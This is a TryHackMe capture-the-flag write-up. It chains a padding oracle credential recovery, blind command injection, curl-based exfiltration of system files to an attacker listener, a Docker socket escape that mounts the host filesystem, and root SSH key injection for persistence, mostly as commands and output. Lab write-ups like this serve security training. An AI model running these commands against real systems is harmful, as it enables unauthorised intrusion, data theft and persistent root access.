# thenewyorkflankees — TryHackMe Writeup

---

## 1. Reconnaissance

```bash
# Run an Nmap scan to discover open ports and services
# Goal: identify the attack surface (Apache and Cockpit CMS)
nmap -sS -p- -n -Pn --min-rate 5000 $TARGET -oA silent
nmap -sVC -p22,80 $TARGET -oA service
```

**Output**
```
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http    Octoshape P2P streaming web service
|_http-title: Hello world!
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

---

## 2. Directory Fuzzing

```bash
gobuster dir -u $TARGET -w /usr/share/wordlists/dirb/common.txt -x .php,.html,.js,.json,.txt
```

**Output**
```
debug.html           (Status: 200) [Size: 2638]
exec.html            (Status: 401) [Size: 0]
favicon.ico          (Status: 200) [Size: 6538]
index.html           (Status: 200) [Size: 4332]
login.html           (Status: 200) [Size: 2670]
```

---

## 3. Interesting Finding at `/debug.html`

The page source revealed a hardcoded debug function:

```javascript
function stefanTest1002() {
    var xhr = new XMLHttpRequest();
    var url = "http://localhost/api/debug";
    // Submit the AES/CBC/PKCS payload to get an auth token
    // TODO: Finish logic to return token
    xhr.open("GET", url + "/39353661353931393932373334633638EA0DCC6E567F96414433DDF5DC29CDD5E418961C0504891F0DED96BA57BE8FCFF2642D7637186446142B2C95BCDEDCCB6D8D29BE4427F26D6C1B48471F810EF4", true);
    ...
}
```

---

## 4. Testing the Debug Endpoint

```bash
curl -v "http://$TARGET:8080/api/debug/39353661353931393932373334633638EA0DCC6E567F96414433DDF5DC29CDD5E418961C0504891F0DED96BA57BE8FCFF2642D7637186446142B2C95BCDEDCCB6D8D29BE4427F26D6C1B48471F810EF4" 2>&1 | cat
```

**Output**
```
HTTP/1.1 200 OK
Custom authentication success
```

Changing the last character returns a `500 Internal Server Error` with `Decryption error` — a classic **Padding Oracle** indicator.

---

## 5. Padding Oracle Attack

The index page referenced AES/CBC/PKCS encryption. The oracle behaviour (200 vs 500) allows byte-by-byte decryption.

```bash
padbuster "http://$TARGET:8080/api/debug/39353661353931393932373334633638EA0DCC6E567F96414433DDF5DC29CDD5E418961C0504891F0DED96BA57BE8FCFF2642D7637186446142B2C95BCDEDCCB6D8D29BE4427F26D6C1B48471F810EF4" \
  "39353661353931393932373334633638EA0DCC6E567F96414433DDF5DC29CDD5E418961C0504891F0DED96BA57BE8FCFF2642D7637186446142B2C95BCDEDCCB6D8D29BE4427F26D6C1B48471F810EF4" \
  16 -encoding 2 -error "Decryption error"
```

**Output**
```
[+] Decrypted value (ASCII): stefan1197:ebb2B76@62#f7cA6B76@6!@62#f6dacd2599
```

**Credentials obtained:**
```
stefan1197 : ebb2B76@62#f7cA6B76@6!@62#f6dacd2599
```

---

## 6. Admin Panel — Blind Command Injection

Logging in at `http://$TARGET:8080/index.html` gives access to a command execution panel at `/exec.html`.

ICMP is blocked, but `curl` callbacks work:

```bash
# Start a listener
python3 -m http.server 80

# Test outbound curl from the target
curl -v "http://$TARGET:8080/api/admin/exec?cmd=curl+192.168.160.214" \
  --cookie "session=33c6b085b02f051a149446b4fe5a6944b77b6fedaf68b74e133c4c2ab78acc21; loggedin=true"
```

**Output** (on our listener):
```
10.129.171.49 - - [25/May/2026 19:55:40] "GET / HTTP/1.1" 200 -
```

Confirmed outbound HTTP. Reverse shells failed, so we pivoted to **curl-based exfiltration**.

---

## 7. Data Exfiltration

We set up a small HTTP server to capture POST requests:

```bash
python3 -c "
import http.server
class H(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        l = int(self.headers.get('Content-Length',0))
        body = self.rfile.read(l).decode(errors='replace')
        line = 'PATH: ' + self.path + '\nBODY:\n' + body + '\n---\n'
        print(line)
        open('exfil.txt','a').write(line)
        self.send_response(200); self.end_headers()
    def do_GET(self):
        line = 'GET: ' + self.path + '\n---\n'
        print(line)
        open('exfil.txt','a').write(line)
        self.send_response(200); self.end_headers()
http.server.HTTPServer(('',80),H).serve_forever()
"
```

Then fuzzed common Linux files:

```bash
ffuf -u "http://$TARGET:8080/api/admin/exec?cmd=curl+-X+POST+--data-binary+@FUZZ+http://192.168.160.214/FUZZ" \
  -H "Cookie: session=33c6b085b02f051a149446b4fe5a6944b77b6fedaf68b74e133c4c2ab78acc21; loggedin=true" \
  -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt \
  -fc 404,500 -t 20 -fw 1
grep -a -A 2 -B 2 "THM" exfil.txt
```

**`/proc/self/environ` revealed:**

```
CTF_DOCKER_FLAG=THM{342878cd14051bd787352ee73c75381b1803491e4e5ac729a91a03e3c889c2bf}
CTF_ADMIN_PANEL_FLAG=THM{a4113536187c6e84637a1ee2ec5359eca17bbbd1b2629b23dbfd3b4ce2f30604}
```

**`/etc/hosts`** confirmed we were inside a Docker container (`172.19.0.2`).  
**`/etc/mtab`** revealed `/run/docker.sock` is mounted inside the container.

---

## 8. Docker Socket Escape

The Docker socket is mounted **read-write** (`"RW": true`), enabling full container management from inside.

### Manual steps (condensed)

```bash
# 1. Confirm socket access — list running containers
curl --unix-socket /run/docker.sock http://localhost/containers/json

# 2. Serve and download a container-creation payload
# Payload mounts the host filesystem at /mnt/host
cat > payload_sleep.json << 'EOF'
{"Image":"padding-oracle-app_web","Entrypoint":["/bin/sh","-c"],"Cmd":["sleep 300"],"Binds":["/:/mnt/host"]}
EOF

# 3. Create → start → exec → exfil output
```

The process is tedious to do manually, so we automated it.

---

## 9. Automated Exploitation & SSH Persistence

Using the Docker Socket Escape script
([docker-socket-escape.py](https://github.com/TryzubRage/Exfiltration-Scripts/blob/main/docker-socket-escape.py)),
we injected our public SSH key into the **host's** `root` authorized_keys
in a single command:

```bash
python3 docker-escape.py 'echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQAB...kali@kali" >> /mnt/host/root/.ssh/authorized_keys'
```

The script:
1. Spins up a helper HTTP server on `LHOST:8888` for payload delivery and exfiltration.
2. Creates a new container from the existing image with `"Binds":["/:/mnt/host"]`.
3. Starts the container and creates a Docker exec against it.
4. Runs the supplied command — writing our key to the **host** filesystem via `/mnt/host`.
5. Cleans up the container and all temporary files automatically.

**Confirm access:**

```bash
ssh -i ~/.ssh/id_rsa root@$TARGET
cat flag.txt
```

```
root@02e849f307cc:~# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## Summary

| Step | Technique | Result |
|------|-----------|--------|
| Recon | Nmap + Gobuster | Found debug endpoint |
| Crypto | Padding Oracle (padbuster) | Credentials: `stefan1197` |
| RCE | Blind command injection via `/api/admin/exec` | Outbound curl confirmed |
| Exfil | curl POST callbacks + ffuf LFI wordlist | Docker flags + env vars |
| Escape | Docker socket abuse (R/W mount) | Host filesystem access |
| Persistence | SSH key injection via `/mnt/host` | `root` shell on host |